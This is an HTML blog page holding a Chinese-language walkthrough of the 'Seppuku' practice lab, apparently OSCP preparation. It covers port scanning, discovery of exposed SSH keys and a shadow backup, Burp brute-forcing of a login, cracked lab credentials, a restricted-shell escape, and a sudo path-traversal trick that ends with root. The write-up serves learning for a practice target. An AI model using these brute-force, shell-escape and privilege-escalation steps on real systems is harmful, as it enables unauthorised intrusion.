@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="信息收集123456789PORT     STATE SERVICE21&#x2F;tcp   open  ftp22&#x2F;tcp   open  ssh80&#x2F;tcp   open  http139&#x2F;tcp  open  netbios-ssn445&#x2F;tcp  open  microsoft-ds7080&#x2F;tcp open  empowerid7601&#x2F;tcp open  unknown8088&#x2F;tcp op">
+<meta property="og:type" content="article">
+<meta property="og:title" content="OSCPLab-Seppedu">
+<meta property="og:url" content="http://example.com/2024/04/26/OSCPLab-Seppedu/index.html">
+<meta property="og:site_name" content="B00ze Escape">
+<meta property="og:description" content="信息收集123456789PORT     STATE SERVICE21&#x2F;tcp   open  ftp22&#x2F;tcp   open  ssh80&#x2F;tcp   open  http139&#x2F;tcp  open  netbios-ssn445&#x2F;tcp  open  microsoft-ds7080&#x2F;tcp open  empowerid7601&#x2F;tcp open  unknown8088&#x2F;tcp op">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2024/04/20/bauwAyxXrWTBjJc.png">
+<meta property="og:image" content="https://s2.loli.net/2024/04/20/fwGml91VzhgP5AF.png">
+<meta property="og:image" content="https://s2.loli.net/2024/04/20/xRjHFMqCrOevBtd.png">
+<meta property="og:image" content="https://s2.loli.net/2024/04/20/Owtj79ybfdJUoPh.png">
+<meta property="og:image" content="https://s2.loli.net/2024/04/20/3vKuBQqWbUSJysd.png">
+<meta property="article:published_time" content="2024-04-26T02:23:52.000Z">
+<meta property="article:modified_time" content="2024-04-26T02:28:56.039Z">
+<meta property="article:author" content="yu1e">
+<meta property="article:tag" content="Labs">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2024/04/20/bauwAyxXrWTBjJc.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>OSCPLab-Seppedu</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/yu1e">项目</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2024/04/26/OSCPLab-Potato/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2024/04/20/OSCPLab-Ha-natraj/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/04/26/OSCPLab-Seppedu/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/04/26/OSCPLab-Seppedu/&text=OSCPLab-Seppedu"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/04/26/OSCPLab-Seppedu/&title=OSCPLab-Seppedu"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/04/26/OSCPLab-Seppedu/&is_video=false&description=OSCPLab-Seppedu"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=OSCPLab-Seppedu&body=Check out this article: http://example.com/2024/04/26/OSCPLab-Seppedu/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/04/26/OSCPLab-Seppedu/&title=OSCPLab-Seppedu"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/04/26/OSCPLab-Seppedu/&title=OSCPLab-Seppedu"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/04/26/OSCPLab-Seppedu/&title=OSCPLab-Seppedu"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/04/26/OSCPLab-Seppedu/&title=OSCPLab-Seppedu"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/04/26/OSCPLab-Seppedu/&name=OSCPLab-Seppedu&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/04/26/OSCPLab-Seppedu/&t=OSCPLab-Seppedu"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="toc-number">2.</span> <span class="toc-text">渗透测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">3.</span> <span class="toc-text">权限提升</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        OSCPLab-Seppedu
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">yu1e</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-04-26T02:23:52.000Z" class="dt-published" itemprop="datePublished">2024-04-26</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Labs/" rel="tag">Labs</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE</span><br><span class="line">21/tcp   open  ftp</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">139/tcp  open  netbios-ssn</span><br><span class="line">445/tcp  open  microsoft-ds</span><br><span class="line">7080/tcp open  empowerid</span><br><span class="line">7601/tcp open  unknown</span><br><span class="line">8088/tcp open  radan-http</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">21/tcp   open  tcpwrapped</span><br><span class="line">22/tcp   open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 cd:55:a8:e4:0f:28:bc:b2:a6:7d:41:76:bb:9f:71:f4 (RSA)</span><br><span class="line">|   256 16:fa:29:e4:e0:8a:2e:7d:37:d2:6f:42:b2:dc:e9:22 (ECDSA)</span><br><span class="line">|_  256 bb:74:e8:97:fa:30:8d:da:f9:5c:99:f0:d9:24:8a:d5 (ED25519)</span><br><span class="line">80/tcp   open  http        nginx 1.14.2</span><br><span class="line">| http-auth: </span><br><span class="line">| HTTP/1.1 401 Unauthorized\x0D</span><br><span class="line">|_  Basic realm=Restricted Content</span><br><span class="line">|_http-server-header: nginx/1.14.2</span><br><span class="line">|_http-title: 401 Authorization Required</span><br><span class="line">139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp  open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)</span><br><span class="line">7080/tcp open  tcpwrapped</span><br><span class="line">|_http-server-header: LiteSpeed</span><br><span class="line">|_http-title: Did not follow redirect to https://bogon:7080/</span><br><span class="line">7601/tcp open  tcpwrapped</span><br><span class="line">8088/tcp open  http        LiteSpeed httpd</span><br><span class="line">|_http-server-header: LiteSpeed</span><br><span class="line">|_http-title: Seppuku</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Linux 2.6.18 (87%), Linux 4.15 - 5.8 (87%), Linux 5.0 (87%), Linux 5.0 - 5.4 (87%), Linux 2.6.32 (87%), Linux 3.4 (87%), Linux 3.5 (87%), Linux 3.7 (87%), Linux 4.2 (87%), Linux 4.4 (87%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 4 hops</span><br><span class="line">Service Info: Host: SEPPUKU; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2024-04-20T12:48:29</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 6.1 (Samba 4.9.5-Debian)</span><br><span class="line">|   Computer name: seppuku</span><br><span class="line">|   NetBIOS computer name: SEPPUKU\x00</span><br><span class="line">|   Domain name: \x00</span><br><span class="line">|   FQDN: seppuku</span><br><span class="line">|_  System time: 2024-04-20T08:48:28-04:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">|_clock-skew: mean: 1h20m00s, deviation: 2h18m35s, median: 0s</span><br></pre></td></tr></table></figure>
+
+<p>21端口匿名登陆失败，smb服务未发现共享目录，80端口会弹出来验证框，要输入用户名和密码</p>
+<p>8088端口查看不了源码</p>
+<p>扫描发现<a target="_blank" rel="noopener" href="http://192.168.190.90:8088/docs/%E7%9B%AE%E5%BD%95%EF%BC%8C%E6%98%AF%E4%B8%AAOpenLiteSpeed">http://192.168.190.90:8088/docs/目录，是个OpenLiteSpeed</a> Web Server 1.6搭建的，有授权后漏洞</p>
+<p>发现<a target="_blank" rel="noopener" href="http://192.168.190.90:7601/w/%EF%BC%8C%E9%87%8C%E9%9D%A2%E6%9C%89http://192.168.190.90:7601/w/password.lst%EF%BC%8C%E5%8F%AF%E4%BB%A5%E6%8B%BF%E6%9D%A5%E5%BD%93%E5%AD%97%E5%85%B8%E7%94%A8">http://192.168.190.90:7601/w/，里面有http://192.168.190.90:7601/w/password.lst，可以拿来当字典用</a></p>
+<p>发现<a target="_blank" rel="noopener" href="http://192.168.190.90:7601/ckeditor/">http://192.168.190.90:7601/ckeditor/</a></p>
+<p><a href="https://smms.app/image/bauwAyxXrWTBjJc" target="_blank"><img src="https://s2.loli.net/2024/04/20/bauwAyxXrWTBjJc.png" ></a></p>
+<p>发现<a target="_blank" rel="noopener" href="http://192.168.190.90:7601/keys/%EF%BC%8C%E5%8F%91%E7%8E%B0SSH%E7%A7%81%E9%92%A5%EF%BC%8C%E4%BD%86%E6%98%AF%E4%B8%8D%E7%9F%A5%E9%81%93%E7%94%A8%E6%88%B7">http://192.168.190.90:7601/keys/，发现SSH私钥，但是不知道用户</a></p>
+<p>发现<a target="_blank" rel="noopener" href="http://192.168.190.90:7601/secret/%EF%BC%8C%E9%87%8C%E9%9D%A2%E6%9C%89hostname%EF%BC%8C%E7%8C%9C%E6%B5%8B%E6%98%AF%E7%94%A8%E6%88%B7%E5%90%8D%EF%BC%8C%E8%BF%98%E6%9C%89shadow.bak">http://192.168.190.90:7601/secret/，里面有hostname，猜测是用户名，还有shadow.bak</a></p>
+<p><a href="https://smms.app/image/fwGml91VzhgP5AF" target="_blank"><img src="https://s2.loli.net/2024/04/20/fwGml91VzhgP5AF.png" ></a></p>
+<p>但是shadow文件中没有有shell权限的用户</p>
+<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p>现在爆破登录框，这里的数据包格式如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: 192.168.190.90</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Authorization: Basic YWRtaW46YWRtaW4=</span><br></pre></td></tr></table></figure>
+
+<p>YWRtaW46YWRtaW4&#x3D;解码之后是admin:admin</p>
+<p>丢到bp里爆破，注意这里选择payload的方法</p>
+<p><a href="https://smms.app/image/xRjHFMqCrOevBtd" target="_blank"><img src="https://s2.loli.net/2024/04/20/xRjHFMqCrOevBtd.png" ></a></p>
+<p><a href="https://smms.app/image/Owtj79ybfdJUoPh" target="_blank"><img src="https://s2.loli.net/2024/04/20/Owtj79ybfdJUoPh.png" ></a></p>
+<p><a href="https://smms.app/image/3vKuBQqWbUSJysd" target="_blank"><img src="https://s2.loli.net/2024/04/20/3vKuBQqWbUSJysd.png" ></a></p>
+<p>爆破出账号密码是admin，Football，登进去了没东西，现在爆破ssh</p>
+<p>账号密码是login: seppuku   password: eeyoree</p>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>进去之后发现是个restricted shell，cd命令无法执行，查阅资料之后发现可以如下方式绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh seppuku@192.168.203.90 -t &quot;bash --noprofile&quot;</span><br></pre></td></tr></table></figure>
+
+<p>查看sudo权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(ALL) NOPASSWD: /usr/bin/ln -sf /root/ /tmp/</span><br></pre></td></tr></table></figure>
+
+<p>没有找到利用方法，只能换个账户登ssh，查看&#x2F;home目录发现tanto用户，用刚才的私钥登</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ssh -i pk tanto@192.168.203.90 -t &quot;bash --noprofile&quot;</span><br></pre></td></tr></table></figure>
+
+<p>在seppuku的目录下发现.passwd文件，里面是12345685213456!@!@A，猜测可以用这个登录最后一个用户samurai</p>
+<p>发现可以执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(ALL) NOPASSWD: /../../../../../../home/tanto/.cgi_bin/bin /tmp/*</span><br></pre></td></tr></table></figure>
+
+<p>但是&#x2F;home&#x2F;tanto&#x2F;下没有.cgi_bin目录，我们创建一个（切换到tanto用户去创建）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir .cgi_bin</span><br><span class="line">cd .cgi_bin/</span><br><span class="line">echo &quot;/bin/bash&quot; &gt; bin</span><br><span class="line">chmod 777 bin #这里一定要改权限，不然samurai无权执行</span><br></pre></td></tr></table></figure>
+
+<p>然后切换到tanto用户，执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /../../../../../../home/tanto/.cgi_bin/bin /tmp/*</span><br></pre></td></tr></table></figure>
+
+<p>拿到root</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/tags/">标签</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/yu1e">项目</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="toc-number">2.</span> <span class="toc-text">渗透测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">3.</span> <span class="toc-text">权限提升</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/04/26/OSCPLab-Seppedu/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/04/26/OSCPLab-Seppedu/&text=OSCPLab-Seppedu"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/04/26/OSCPLab-Seppedu/&title=OSCPLab-Seppedu"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/04/26/OSCPLab-Seppedu/&is_video=false&description=OSCPLab-Seppedu"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=OSCPLab-Seppedu&body=Check out this article: http://example.com/2024/04/26/OSCPLab-Seppedu/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/04/26/OSCPLab-Seppedu/&title=OSCPLab-Seppedu"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/04/26/OSCPLab-Seppedu/&title=OSCPLab-Seppedu"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/04/26/OSCPLab-Seppedu/&title=OSCPLab-Seppedu"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/04/26/OSCPLab-Seppedu/&title=OSCPLab-Seppedu"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/04/26/OSCPLab-Seppedu/&name=OSCPLab-Seppedu&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/04/26/OSCPLab-Seppedu/&t=OSCPLab-Seppedu"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2010-2024
+    yu1e
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/yu1e">项目</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
